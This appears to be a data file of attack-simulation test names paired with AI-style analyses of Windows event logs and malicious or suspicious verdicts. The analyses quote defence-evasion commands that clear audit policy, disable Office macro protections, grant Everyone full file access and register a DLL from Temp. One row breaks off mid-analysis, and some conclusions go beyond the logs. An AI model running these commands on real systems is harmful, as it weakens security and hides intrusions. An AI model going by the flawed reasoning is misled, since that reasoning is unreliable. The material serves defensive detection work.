- Monitor network traffic for additional signs of data exfiltration or communication with command and control servers.
- Review system privilege assignments and ensure least privilege configurations."
NetWire RAT Registry Key Creation,"Based on the analysis of the Windows event logs provided, here is a detailed assessment:

### Analysis

1. **Registry Modifications:**
   - The logs show a `cmd.exe` process executing commands that add registry entries under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. This registry path is commonly used for persistence mechanisms by malware. The command adds a startup entry for `C:\Users\admin\AppData\Roaming\Install\Host.exe`, which is suspicious.
   - The entries include additional registry modifications involving `HKCU\SOFTWARE\script`, marking specific values and an install date. These operations are placed into the registry, making them persist across reboots which is indicative of either some legitimate program configuration changes or potentially something malicious attempting to establish persistence.

2. **Unusual Process Execution:**
   - There's a Sysmon event showing `cmd.exe` being used with specific and targeted registry addition commands through `reg.exe`. This is typically not a common operation for regular users and can be perceived as a likely indicator of compromise.
   - The parent process for these commands is `wsmprovhost.exe` with the command line option `-Embedding`, usually indicating that it’s being used to host a provider in a Windows Management Instrumentation (WMI) scenario, which could potentially be exploited.
  
3. **Microsoft Edge Update Activity:**
   - There are numerous entries relating to the update process of Microsoft Edge (`MicrosoftEdgeUpdate.exe`). This could be benign system maintenance activity, but when combined with other events, it might need correlation with typical update schedules to rule this out.

4. **User Context:**
   - Several actions taken by `SERVER002\admin_test` with high integrity level imply administrative privileges, which, if not appropriately controlled, represent a significant security risk if compromised.

5. **Time Service Events:**
   - There are Kernel-General and Security-Auditing events concerning changes in system time. While not necessarily malicious, unexpected or unauthorized time changes can affect scheduled security scans and event logs.

6. **Parent-Child Process Relationship:**
   - The logs indicate parent-child relationship between typical Windows processes, but the main area of concern remains with `cmd.exe` and its subsequent processes modifying registry keys.

### Assessment
- **Resolution: MALICIOUS**

Based on the presence of registry modifications using command-line tools with administrative privileges and entries indicative of a persistence mechanism under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, it is highly likely there is malicious activity on the system. The nature and execution of these commands suggest an active attempt to maintain persistence on the affected machine, which is a common tactic used by malware.

### Guidance on How to Proceed
1. **Immediate Isolation:** Isolate the affected machine from the network to prevent further potential spread or communication with any malicious servers.
2. **In-depth Malware Analysis:** Conduct a thorough analysis of the file `C:\Users\admin\AppData\Roaming\Install\Host.exe` and any related files for malware signatures.
3. **Review User Accounts:** Investigate the user account `SERVER002\admin_test` for unusual patterns or unauthorized access.
4. **Registry Review and Cleanup:** Validate and clean malicious registry keys after root cause identification and ensure they are not serving as persistence mechanisms.
5. **System Restore and Patch Management:** Consider restoring the system to a previous known clean state and ensure all systems are patched with the latest security updates.
6. **Monitoring and Incident Response:** Enhance monitoring for similar activities and coordinate with your incident response team to fully address this security event.

With these steps, both containment and remediation efforts will help in mitigating the potential threat posed by these logs."
Disable Microsoft Office Security Features,"### Analysis of the Windows Event Logs:

Upon analysis of the event logs provided, there are several key observations:

1. **Frequent Use of PowerShell with Registry Modifications:**
   - A PowerShell script is executed that makes multiple modifications to the Windows Registry, particularly to Microsoft Office Excel settings, to disable various security features such as Protected View and VBA warnings.
   - The execution of PowerShell with the following command is notable:
     ```
     ""powershell.exe"" & {New-Item -Path \""HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\\"", New-Item -Path \""HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\\"", New-Item -Path \""HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\\"", New-ItemProperty -Path \""HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\\"" -Name \""VBAWarnings\"" -Value \""1\"" -PropertyType \""Dword\"", ... }
     ```
   - Such modifications could indicate an attempt to bypass security measures typically employed to protect documents from macro-based attacks.

2. **Wevtutil and Conhost Executions:**
   - The `wevtutil.exe` and `conhost.exe` processes are frequently spawned but lack context on their operations, making it difficult to ascertain their necessity.

3. **Execution of Standard Microsoft Utilities:**
   - The logs show executions of `hostname.exe`, `whoami.exe`, and standard Microsoft Edge Update processes. While these in themselves aren't necessarily malicious, the agglomeration of utility usage can point towards reconnaissance activity or attempts to ascertain system information or configuration.

4. **Elevation of Privileges:**
   - The Security log indicates a logon with elevated privileges, though it is a system account logon, which could be normal unless coupled with other malicious indicators.

5. **Microsoft Edge Update Activity:**
   - There is activity related to the updating of Microsoft Edge, as seen with multiple executions of `MicrosoftEdgeUpdate.exe` processes. This appears to correspond with the normal application update cycle, as indicated by both Sysmon and Windows Update logs.

### Threats and Risks:

- The **PowerShell script** that modifies registry entries to weaken security controls in Microsoft Excel is suspicious and a potential threat vector. This behavior is commonly associated with macro or script-based malware strategies, where attackers disable security features to facilitate the execution of harmful scripts.
  
- **Frequent execution of utilities and system processes**, while individually innocuous, in combination with suspicious PowerShell activities, merit further scrutiny.

### Next Steps:

1. **Immediate Further Investigation:**
   - Investigate the source and intention of the PowerShell script that executed registry modifications. Determine whether these changes were made by an authorized user/administrator or whether they hint towards unauthorized access or scripting.

2. **Enhanced Monitoring and Logging:**
   - Increase logging and monitoring on the `admin_test` account and associated activities, particularly around PowerShell execution and registry changes.
   - Check for any abnormal behavior or deviations from typical use patterns.

3. **Incident Response Measures:**
   - Consider reverting the registry changes made by the suspicious PowerShell script, and ensure that Excel's security settings are re-enabled.
   - Perform a threat hunt focusing on common persistence mechanisms to verify no additional indicators of compromise are present.

4. **User Awareness and Training:**
   - Raise awareness with users about clicking on unknown or suspicious documents that prompt for macro execution.
   - Conduct training on security best practices relating to phishing and script-based threats.

### Resolution: **SUSPICIOUS**

The activities logged contain elements of action that do not appear entirely benign and warrant further investigation. While a definitive compromise is not evident, the actions align with tactics often used to establish persistence or prepare an environment for further exploitation. Immediate steps should be taken to further investigate and prevent potential malicious activities."
Malware Masquerading and Execution from Zip File,"Upon analyzing the provided Windows event logs, the following observations were made:

### Suspicious and Potentially Malicious Indicators:

1. **PowerShell Activity:**
   - There is a PowerShell script execution that involves unpacking a zip file (`data.zip`) and executing a command script (`README.cmd`) from the Downloads directory. This is atypical behavior and suggests an attempt to execute potentially unauthorized or malicious scripts.
   - This command execution is suppressed (`> $null 2> $null`), indicating an attempt to hide output and errors, common in malicious activities.

2. **Rundll32 Execution:**
   - The execution of `rundll32.exe` with a DLL (not fully named here as `2.dll`) is initiated by a script (`README.cmd`). The use of `rundll32.exe` to execute potentially malicious DLLs is a common tactic used by attackers to run code.

3. **Command Prompt and Scripting:**
   - The sequence of using cmd.exe to launch scripts downloadable to the user’s Downloads folder is suspicious, particularly when combined with PowerShell and rundll32 activity.

4. **Historical Usage of Wevtutil:**
   - There are logs showing `wevtutil.exe` being executed. This utility is commonly used to manage event logs, and may be used to clear logs to cover tracks.

5. **Privilege Escalation:**
   - Multiple logs, particularly with EventID 4672, indicate privileges being utilized (e.g., `SeDebugPrivilege`, `SeLoadDriverPrivilege`), which suggests that an account with administrative privileges was leveraged.

6. **Network Connections and Logons:**
   - There are NTLM logons (EventID 4624) from external IP addresses that correspond with administrative logins. Particularly, the IP `192.168.0.102` has been logged for remote logons, which might indicate lateral movement or unauthorized access.

### Benign Activities:

1. **Windows Updates:**
   - The logs reflect Microsoft Defender Antivirus updates and Microsoft Edge updates as routine system maintenance, indicating that these activities themselves are benign and expected.
   
2. **System and Application Logging:**
   - Various services starting and stopping, including the Edge update services, do appear normal in isolation and are expected behaviors.

### Assessment and Recommendations:

After reviewing the logs, it is evident there are multiple actions indicative of potential compromise, primarily the suspicious scripting activities and possibly unauthorized privilege escalations. The logs could point towards an attacker having gained administrative access to perform code execution or lateral movement.

### Resolution:

**Resolution: MALICIOUS**

Given the potential execution of unauthorized scripts, suppression of command output, and usage of `rundll32.exe` among other red flags, the activity should be considered **malicious**. Immediate actions should include:
- Isolating the affected machine from the network.
- Conducting a forensic investigation to understand the full scope of the compromise.
- Implementing endpoint detection and response measures to prevent similar incidents.
- Reviewing and reinforcing security policies, especially around privileged account usage and remote logon configurations.
- Ensuring all antivirus and system patches are up-to-date across the infrastructure. 

It is crucial to understand the entry point and extent of the threat to prevent future compromises."
Clear Windows Audit Policy Config,"Upon reviewing the event logs from the provided data, the following analysis is conducted to identify any indicators of malicious activity:

1. **Time Modification Events**:
   - Multiple kernel general events (EventID: 1 and 24) indicate the system time was modified. The logs show both the old and new times, but this could be part of routine system time synchronization.

2. **Security Events**:
   - **EventID 4672**: Indicates that a user, `admin_test`, was assigned special privileges, including `SeDebugPrivilege`. This can be concerning if assigned unexpectedly, as it can be used to debug and access sensitive information.
   - **EventID 4624**: Shows a network logon using NTLM and a logon type 3 (network), carried out by `admin_test`. The logon from IP addresses `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102` could indicate remote access.
   - **EventID 4719**: Multiple changes to the audit policy by `admin_test` suggest potential tampering with logging/audit configurations.

3. **Sysmon Events**:
   - **EventID 1 (Process Creation)**: Noteworthy is the execution of `cmd.exe` with command line parameters `/c auditpol /clear /y & auditpol /remove /allusers`. This indicates an attempt to clear audit policies, which is a typical tactic to erase tracks or disable security logging.
   - **Repeated use of `wevtutil`, `conhost.exe`, `whoami.exe`**: While `wevtutil.exe` is used to manage event logs, its frequent execution alongside audit policy changes could indicate log manipulation or cleaning efforts.

4. **Application Logs**:
   - The SPP event (EventID: 16384) references the Rules Engine, typical in normal operation, lacking immediate suspicion on its own.

5. **Command Execution Context**:
   - High integrity level execution of `cmd.exe` commands and `auditpol` manipulation suggests these actions were performed with elevated privileges.

**Assessment and Conclusion**:
- There are clear signs of suspicious activity, particularly related to audit policy modifications and high-privilege command execution. The combination of privileged operations (`SeDebugPrivilege`) for `admin_test`, network logons, and audit policy clear and remove commands indicate potential preparatory steps for malicious actions or attempts to cover tracks.

**Resolution**: **MALICIOUS**
- The evidence strongly suggests malicious activity, likely involving privilege escalation and alteration of audit logs to hide malicious acts. Immediate containment measures should be initiated by isolating the affected system, changing all credentials associated with `admin_test`, and conducting a comprehensive forensic investigation. Additionally, reviewing account activity and strengthening security policies are advised."
Create and start VirtualBox virtual machine,"Upon examining the Windows event logs, several specific entries in the Sysmon log stand out as potentially suspicious or warranting closer examination.

### Suspicious or Anomalous Behaviors Identified:

1. **PowerShell Execution**:
   - The execution of `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` by `SERVER002\\admin_test` could potentially be a concern, especially in a high-level executive user's environment, as PowerShell is frequently used for administrative tasks and can also be commonly used by attackers. However, without detailed command-line arguments, determining intent is challenging.

2. **Frequent Use of `wevtutil.exe`**:
   - The use of `wevtutil.exe` (appearing multiple times in processes such as `ProcessId 5376`, `6616`, `1920`, `5756`, and `3128`) could indicate activity related to the management of Windows event logs. This tool can be used to clear, export, or manipulate event logs, actions which an attacker might perform to cover their tracks. Given that these commands are executed around the same time and by the same user, further investigation into their command-line activities would be prudent.

3. **VirtualBox VM Creation**:
   - `cmd.exe` is seen executing commands related to Oracle VirtualBox (e.g., `VBoxManage.exe`), to create and start a virtual machine named ""file VM"". This behavior is unusual for regular business operations and could be a tactic to create isolated environments for malicious activities or data exfiltration. Although VirtualBox is a legitimate application, its sudden use in this context raises questions about legitimate versus unauthorized activities.

4. **High-Integrity Processes**:
   - Many of the processes are running with high integrity levels, suggesting they operate with elevated privileges which, if not part of routine operations, might be leveraged for privilege escalation or execution of unauthorized tasks.

### Assessment:

The combination of script execution (PowerShell), potential log file tampering (wevtutil.exe), and unexpected system modifications (VirtualBox operations) strongly indicates activity worth more than a casual glance. While each of these activities, independently, can be legitimate, their occurrence in succession and their context being on an executive machine are significant red flags.

### Conclusion:

**Resolution: SUSPICIOUS**

The logs demonstrate activities that, while not definitively malicious based on the entries provided, do present a series of actions that are unconventional for typical user behavior, particularly for a high-ranking executive machine like the CEO's setup. Additionally, such activity could be indicative of malicious behavior or preparation for a future malicious exploit.

### Recommendations:

1. **Conduct a Detailed Investigation**:
   - Analyze the PowerShell command logs (if available) to understand the specific commands executed.
   - Retrieve additional command-line details associated with `wevtutil.exe` usage to determine the intent of these executions (e.g., view, export, or clear logs).
   - Investigate any VirtualBox-related activities deeper, including determining who initiated these actions and for what purpose.

2. **Perform User Verification**:
   - Ensure that the user `SERVER002\\admin_test` is legitimate and investigate if this account shows any behaviors indicative of compromise.

3. **Review Security Tools**:
   - Ensure that Endpoint Detection and Response (EDR) systems are fully operational and investigate why these actions were triggered.

4. **Monitor Environment**:
   - Increase monitoring on similar execution patterns across the network to capture any other instances of irregular activity."
Activate Windows NoControlPanel Group Policy Feature,"### Analysis of Windows Event Logs

#### Observations:

1. **PowerShell Logs**: No PowerShell logs were provided. PowerShell activity is often indicative of administrative or potentially malicious scripting on a host. The absence of such logs provides no evidence to assess this aspect.

2. **System Log**:
   - The time synchronization event with `time.windows.com` is a typical occurrence on Windows machines to ensure the system clock is correct. No suspicious activity detected here.

3. **Application Log**:
   - There are events regarding the stopping of the 'edgeupdate' service which aligns with typical software maintenance or update activity. Not immediately suspicious without further context.

4. **Sysmon Log**:
   - Multiple instances of common Windows utility executions such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe`. The execution of these binaries itself is not inherently suspicious, but the context may be.
   - The `cmd.exe` executed a command to modify registry settings to disable the Control Panel, which is a sign of potential unauthorized configuration change. This can be leveraged by malware or a threat actor to restrict user access.
   - The majority of EdgeUpdate executable occurrences indicate normal update processes. However, they dominate the logs which make it difficult to discern any odd behaviors specific to the update processes.
   - The repeated references to processes running under `NT AUTHORITY\SYSTEM` imply higher privileges, typical for system processes.

#### Assessment:

- **Suspicious Activity**:
  - The command altering the registry is notable:
    ```
    ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f
    ```
  - This command is suspicious as it changes system settings without apparent justification. It suggests either unauthorized administrative action or potential malicious behavior aiming to disable control access.

- **EdgeUpdate Activity**:
  - The high frequency of Microsoft Edge Update related entries might represent repetitive normal update activities, suggesting benign activity. However, it can camouflage malicious actions if done intentionally. Detailed verification of update authenticity may be recommended.

#### Guidance:

- **Immediate Action**:
  - Investigate the user `SERVER002\admin_test` who executed the registry change command.
  - Review any corresponding alerts or logs around the time of this registry change for additional context.
  - Check compliance with company policy regarding registry modifications.

- **Further Investigation**:
  - Verify the authenticity of the edgeupdate executables' signatures to rule out any tampering.
  - Review system access logs and user login patterns to ascertain whether the actions align with expected behavior.
  - Consider monitoring the system for abnormal network activity that might correspond with unauthorized control panel restrictions.

#### Final Resolution: **SUSPICIOUS**

The main flag here is the registry modification which could indicate malicious intent or a policy breach. Further investigation is necessary to confirm or dismiss any malicious activities."
BlackByte Ransomware Registry Changes - CMD,"### Detailed Analysis

1. **Process Execution and Command-Line Arguments:**
   - There are frequent activations of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. `wevtutil.exe` is used to manage event logs and subscriptions. Frequent invocations may indicate attempts to query or clear event logs which can be used to cover tracks after malicious activity.
   - Multiple executions of `cmd.exe` were observed with command-line arguments that include registry modifications (`reg add`). These modifications change settings such as `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`. These registry changes affect Windows' security and privilege settings, potentially indicating an attempt to weaken security configurations.
   - Execution of `whoami.exe` was observed, which is often used by attackers to identify the privileges of the compromised account.

cacls - Grant permission to specified user or group recursively,"### Analysis of Logs

Upon examining the provided logs, several observations and findings were made:

#### Security Log
1. **Event 4616**: These events represent the changing of system time by `svchost.exe` under `LOCAL SERVICE`. The time adjustment on a Windows machine could hint at attempts to obfuscate time-locked logs or hide malicious activities. However, it's worth noting that this is typically a routine system operation unless correlated with other suspicious activities.

#### Application Log
1. **Microsoft-Windows-Security-SPP Events**: The logs indicate the Software Protection Platform Service activity, which is normal behavior related to licensing and activation processes.

#### System Log
1. **Kernel-General and Time-Service Events**: These logs appear related to routine system operations such as time changes and confirmations from `time.windows.com`. 

#### Sysmon Log
1. **Batch Commands via `cmd.exe`**:
   - Multiple command executions are being logged. The most notable include:
     - Operations creating temp directories and files (`mkdir`, `echo`)
     - Manipulation of access control lists (`icacls.exe`) to grant full permissions (`/grant Everyone:F`). This is particularly concerning as it relaxes file permissions extensively, potentially enabling unauthorized access.
   - These actions are performed by the user `admin_test`, which may hint at the execution of some scripted operations that could be part of either an administrative task or potential malicious activity.
  
2. **Processes Running Under High Integrity Level**:
   - Processes, including `cmd.exe`, `conhost.exe`, and using commands like `icacls` with high-integrity contexts—indicative of administrative privileges. 
   - Actions include identifying the user (`whoami.exe`) and system details (`hostname.exe`), often seen in penetration testing or malware reconnaissance phases.

3. **Suspicious Execution Sequences**:
   - The sequence and command line content suggest a potential batch or script running with system-level permissions to make environmental modifications (like changing ACLs) that usually aren't part of a typical operation schedule or task list.
   
4. **Use of `wevtutil.exe`**:
   - Seen repeatedly, which is a command-line utility used to manage event logs—could be leveraged either for legitimate maintenance or to clear logs to cover tracks.

### Assessment
Based on the evaluation, the activity observed across these logs—specifically the adjustment of ACLs to allow full access arbitrarily and the use of command-line tools typically associated with malware or post-exploitation activities—raises concerns about potential compromise.

### Conclusion: SUSPICIOUS
This set of logs suggests activities in a grey area—they could belong to a scripted administrative task. However, they closely align with common patterns used in malicious activities, such as privilege escalation and log manipulation. It necessitates further investigation, focusing on the following:

1. **Correlate Activities**: Check for any scheduled tasks, scripts, or tools deployed recently that may relate to these operations.
2. **User Activity Review**: Investigate actions under the `admin_test` account, especially concerning authorizations or elevated tasks.
3. **System Scan**: Conduct detailed scans with updated security tools to search for known threats or anomalies.
4. **Engage Users and IT**: Verify with the concerned IT or administrative staff to determine if these actions were part of a legitimate maintenance plan or intervention by authorized personnel."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"### Analysis

Upon examination of the provided Windows event logs, it appears there are indicators of potentially malicious activities. Here's a breakdown of some notable elements:

#### Windows PowerShell Logs
- **Suspicious PowerShell Activity**: Several PowerShell events show the execution of a script with names and execution patterns that might indicate malicious intent. The script `InstallUtilTestHarness.ps1` appears to be executing operations involving `data.004.dll`. These operations involved:
  - The use of InstallUtil, a well-known .NET installation utility often leveraged by attackers for executing code without dropping physical files to disk. It was executed with a `/action=uninstall` method.
  - The script is used to write to temporary files, which is a common technique for obfuscating malicious activity.

#### Sysmon Logs
- **Process Execution Patterns**:
  - **`csc.exe` and `cvtres.exe` Execution**: These processes from the .NET framework (command-line compiler and resource utilization tool) were spawned by PowerShell. Such behavior is indicative of in-memory code compilation or resource manipulation, common in fileless malware attacks.
  - **PowerShell Execution**: Multiple instances of `powershell.exe` were executed in quick succession, and one of these was related to executing the `InstallUtilTestHarness.ps1` script.
  - **EdgeUpdate Activity**: There were multiple instances of `MicrosoftEdgeUpdate.exe` being executed. These executions don't immediately indicate maliciousness but could be part of a valid update process. However, combined with other unusual activities, they warrant further scrutiny.

#### Red Flags
1. **Abnormal Use of InstallUtil**: The script clearly tries to execute `InstallUtil`, which is typically used for legitimate installations, in an odd logging context (`/logfile= /logtoconsole=false`). Attackers often use InstallUtil for stealthy operations, like loading a DLL file without writing an executable to disk.
   
2. **File Writing Patterns**: Temp files are being written to by the script which is a common technique for evading static defenses typically.

3. **Administrator Usage**: The user `SERVER002\admin_test` is executing these commands, which suggests the potential for privilege misuse or compromise of an admin account.

### Assessment

Based on the analysis, there are strong indicators of suspicious behaviors primarily stemming from the misuse of legitimate tools (living off the land) such as InstallUtil and PowerShell scripting. The presence of these elements in combination with the execution trace in the Sysmon logs suggests this is more than mere administrative activity or benign scripts.

### Resolution: MALICIOUS

- **Findings**:
  - Misuse of PowerShell and use of InstallUtil with potentially malicious scripts.
  - Compilation activities indicating fileless malware patterns.
  - Execution potentially leading to unauthorized privilege escalation or lateral movement.

### Next Steps

**Immediate Actions**:
- Suspend access of the `SERVER002\admin_test` account until further review.
- Isolate the affected system (Server002) to prevent potential spread.
- Conduct a detailed forensic analysis of volatile memory and persistent storage for additional indicators or remnants of the attack.
- Review EDR and other security controls for similar patterns across other systems.

**Long-term Actions**:
- Evaluate and reinforce PowerShell script logging and execution policies.
- Establish tighter monitoring and alerts for the misuse of InstallUtil and other administrative tools.
- Train users, especially in privileged roles, on recognizing and reporting phishing attempts or anomalous behaviors.

By conducting these actions, the risk of further compromise will be mitigated, and an understanding of the methods used can inform future preventative measures."
Register-CimProvider - Execute evil dll,"In reviewing the logs provided, here is a detailed analysis focusing on any suspicious activities:

### Suspicious or Anomalous Behaviors Observed:
1. **Frequent PowerShell and `wevtutil.exe` Executions:**
   - Several events involve the execution of `powershell.exe` and `wevtutil.exe`. `wevtutil.exe` is a legitimate Windows utility used to manage Windows event logs, and frequent usage may indicate log tampering attempts.
   - PowerShell is a powerful scripting tool and is commonly used in legitimate administrative tasks but is also frequently leveraged by attackers for malicious purposes.

2. **Unusual Command-Line Activity:**
   - The command `cmd.exe /c C:\Windows\SysWow64\Register-CimProvider.exe -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\Win32\data.dll""` is noteworthy. The registration of WMI providers, especially from transient directories like Temp, might indicate attempts to persist on a machine or alter system behavior.
    
3. **Frequent EdgeUpdate Executions:**
   - There are multiple events related to `MicrosoftEdgeUpdate.exe`. While updating software is a legitimate task, the frequency and nature of these events warrant scrutiny, especially since they involve processes launching from a temporary directory with system-level integrity.

4. **`whoami.exe` and `hostname.exe` Execution:**
   - Usage of `whoami.exe` and `hostname.exe` is typical for system and user reconnaissance, which attackers commonly execute to gather more info about the environment in a compromised host context.

### Indicators of Potential Malicious Activity:
- **Temp Directory Executables:**
  - Executing applications from directories such as `C:\Users\ADMIN_~1\AppData\Local\Temp\` is unconventional for typical system operations and can be a sign of malicious activity, as it is often used by malware for execution and evasion.
  
- **Persistent Process Creation with System-Level Integrity:**
  - The use of command-line arguments with system process privileges by Microsoft Edge’s updater and its sub-processes can provide an attack surface for privilege escalation or persistence mechanisms if subverted by attackers.

### Events Requiring More Investigation:
- The registration of a CIM provider from the Temp directory should be analyzed to ensure that it isn't a vector for installing malicious software.
- The frequencies of `wevtutil.exe` and `cmd.exe` along with their command-lines should be further examined to ensure they are not hiding malicious intents.
  
### Assessment:
Based on the activities captured in the logs:
- **Resolution: SUSPICIOUS**
  - While no single entry conclusively indicates a full compromise, the combination of discovered behaviors and executed commands, particularly the frequent and atypical usage of system tools alongside processes with high integrity levels, raises concerns that warrant deeper investigation.

### Recommended Actions:
- Initiate a containment protocol to isolate the machine, ensuring no potential malicious activities propagate through the network.
- Conduct a thorough review of the file mentioned in the command-line (`data.dll`) and associated PowerShell scripts, if available, by performing static and dynamic analysis.
- Verify if the `MicrosoftEdgeUpdate.exe` and any related executables have legit hashes by checking them against known-good versions or threat intelligence databases.
- Increase monitoring on this host and similar administrative accounts for any unusual behavior, force password changes, and consider stronger authentication mechanisms.

If subsequent investigations reveal explicit malicious content or compromised binaries, escalate the resolution to ""MALICIOUS"" and pursue appropriate threat remediation procedures."
Abusing MyComputer Disk Cleanup Path for Persistence,"### Detailed Analysis:

Upon reviewing the provided Windows event logs from the Sysmon, Security, and Application channels, several observations can be made:

#### 1. **Process Execution Analysis:**

- The logs show multiple executions of standard Windows utilities and system processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe`, among others. These utilities were executed by the user `SERVER002\admin_test` with high integrity levels, which might indicate a level of administration on the system.

- **Specific Concern:**
  - The execution of `cmd.exe` with the command `\""cmd.exe\"" /c reg add ...` to add a registry entry modifying the cleanup path to `notepad.exe` is unusual. Modifying registry paths is often associated with persistence mechanisms in malware activity, allowing automatic execution of potentially unwanted processes.

- Many processes are launched by the `SYSTEM` account, which is expected for legitimate scheduled tasks or system-level services.

#### 2. **Command Line and Parent Process Analysis:**

- Observing the command line and parent processes, the executions appear to be standard, except for the aforementioned registry modification. Often, a compromised system might show suspicious command-line parameters, especially involving network connections or process injection, but none such activities are evident here.

#### 3. **Security Log Analysis:**

- Security logs show numerous successful logon (Event ID 4624) and privileges assigned (Event ID 4672) for the `SYSTEM` user as part of normal Windows operations. The privilege list includes responsibilities typical for system operations, such as `SeBackupPrivilege` and `SeDebugPrivilege`.

- **No Unauthorized Logins:**
  - There is no indication of unauthorized logons or privilege escalations beyond expected system operations.

#### 4. **Application and PowerShell Logs:**

- **Windows Defender Log:** The Windows Defender is reported as being active, which is a good sign and suggests real-time protection was enabled during this timeframe.

- **No significant PowerShell activity**: The absence of PowerShell logs (or significant PowerShell activity) prevents any conclusion regarding script-based attacks which are often used in fileless malware incidents.

### Assessment and Resolution:

- **SUSPICIOUS:** The activity surrounding the registry modification is suspicious as it might indicate an attempt at persistence by altering the system's cleanup path. However, there is no definitive evidence pointing directly to malicious intent or compromise in these logs, and it is possible this registry change could be benign or part of legitimate, albeit unusual, system administration activity.

### Guidance on How to Proceed:

1. **Further Investigation:**
   - Conduct a detailed investigation into the intent and origin of the registry modification. Check if this change was part of a policy update or if it's part of legitimate software operations.
   - Review other endpoints for similar behaviors, especially those involving critical assets.
   - Cross-reference the log timestamps with any suspicious activities reported or noticed by the users or EDR.

2. **Threat Hunting and Monitoring:**
   - Monitor this and other systems for any further unexpected registry changes or executions of `cmd.exe` with suspect command-line arguments.
   - Given the potential for a persistence mechanism, engage in comprehensive threat hunting on the network for any associated Indicators of Compromise (IOCs).

3. **Security Improvement:**
   - Consider enhancing logging for better visibility, particularly for registry key changes, which should be audited and flagged if not complying with expected policies.
   - Re-evaluate security settings to ensure high-risk actions require additional monitoring or alerts.

Overall, while the system did not exhibit clear signs of compromise, this particular action should not be overlooked and warrants a thorough follow-up."
Disable Windows Remote Desktop Protocol,"Upon analyzing the provided Windows event logs, a few key observations emerge that may warrant further investigation:

1. **Time Manipulation:**
   - The logs contain several instances of time changes. Event ID 4616 in the security log indicates changes to the system time. This could be an attempt by a threat actor to hide traces of their activities, as time changes are often used to disrupt forensic timeline reconstruction. The changes from ""2024-10-24 18:28:33.3228071"" to ""2024-10-24 18:28:28.8978156"" stand out.

2. **Registry Modification:**
   - Sysmon logs indicate a command executed via cmd.exe: `cmd.exe /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f`. This modifies a registry key related to Terminal Services which could potentially be used to enable or disable Remote Desktop Protocol (RDP) connections. Such actions could signify an attempt to secure persistence or control over the system.

3. **Network Service Activities:**
   - Multiple processes like `MicrosoftEdgeUpdate.exe` and associated files run under the ""NT AUTHORITY\SYSTEM"" account, which operates with high privileges. While this could be part of regular update processes, the high volume and nature of executions (often involving command-line operations with multiple parameters) can be indicative of update abuse or privilege escalation attempts.

4. **Presence of Tools:**
   - Utilities such as `whoami.exe` are executed. Although this could be legitimate administrative activity, the context and frequency can sometimes denote reconnaissance activities. However, the direct correlation to any explicit malicious intent is not clear without corroborating indicators or context.

5. **Service Manipulations:**
   - The application log suggests the consistent stopping of services (`Service stopped` by `edgeupdate`). While stopping services could be routine, frequent service disruptions, especially on a server machine, can be anomalous, particularly if associated with any unexpected downtime or functionality issues.

In conclusion, the events detected have potential signs of malicious activity, particularly the manipulation of system time and registry alterations which are often associated with malicious actions such as privilege escalation or remote access capabilities. However, without corroborating direct evidence of malicious payloads or compromised integrity, the activity is categorized as **SUSPICIOUS**.

**Guidance:**
- Further investigate the registry changes and verify if they coincide with any unauthorized remote access.
- Correlate the time changes in the logs with actual events or incidents to ascertain their impact.
- Conduct a detailed timeline analysis for any unusual file or service activities around those timestamps.
- Review and validate all edge update activities with the case of potential update hijacking or unauthorized software behavior.
- Ensure all logging, especially for processes and the registry, is enabled and reviewed regularly.

Perform these steps with a priority on verifying the system's integrity, reviewing external access logs, and scanning for anomalies in the network traffic from this host."
Headless Browser Accessing Mockbin,"Upon analyzing the provided logs, the activities have been assessed as follows:

1. **Time Change Events:**
   - There are multiple instances of Event ID 4616 indicating system time changes. These are typically benign when linked to system services like `svchost.exe`, as part of legitimate time synchronization processes.

2. **Logon Events:**
   - Event IDs 4624 (successful logon) and 4672 (special privileges assigned) primarily show logons by the SYSTEM account and do not appear abnormal by themselves. SYSTEM account activities are expected for services execution.

3. **Permission Changes and Account Enumeration:**
   - Events with IDs 4672, 4798, and 4799 show privilege assignment and account enumeration (e.g., Administrator, admin_test, Guest, etc.) performed by `SERVER002$`. This could warrant further review but doesn't provide direct evidence of malicious activity. 

4. **Microsoft Account and Credential Checks:**
   - Event ID 5379 could denote credential checks related to Microsoft accounts, which failed. These are often part of regular system checks or misconfigured applications/services.

5. **Command Execution with Elevated Rights:**
   - The `whoami.exe`, `cmd.exe` using `chrome --headless`, and several instances of `MicrosoftEdgeUpdate.exe` executions show activities performed by `admin_test`. The command line arguments used in `cmd.exe` are peculiar, especially opening a web connection using Chrome in headless mode. While this does not directly indicate malicious activity, it is unconventional.

6. **PowerShell Activity:**
   - Instances of PowerShell execution are noted, particularly with restricted execution policies which may control script behavior (`-ExecutionPolicy Restricted`). The commands logged don't immediately appear harmful but could be scrutinized further for ensuring no unnoticed abuses.

7. **Sysmon Logs:**
   - Numerous process creations by standard Windows services are logged. There is no immediate indication of clearly malicious behavior although the activities, such as those involving `taskhostw.exe`, do raise questions when tied to a sensitive account like `admin_test`.

**Assessment:**
Overall, the logs exhibit activities that are consistent with legitimate system maintenance tasks. However, certain command executions and the combination of tasks might hint at misuse or testing, especially considering the `cmd.exe` execution involving a headless browser. This necessitates a closer look to verify no permissions were leveraged inappropriately, especially from the `admin_test` account.

**Resolution:**
Based on the evaluation above, the logs exhibit:
- Indicators that suggest the need for further investigation due to uncommon command-line actions and account privilege assignments, warranting a classification of **SUSPICIOUS**. 

**Guidance:**
- Review the context of `admin_test` account activities, ensuring its usage aligns with organizational policies.
- Cross-reference activities with recent security patches or user activity logs to ensure no security parameters were bypassed.
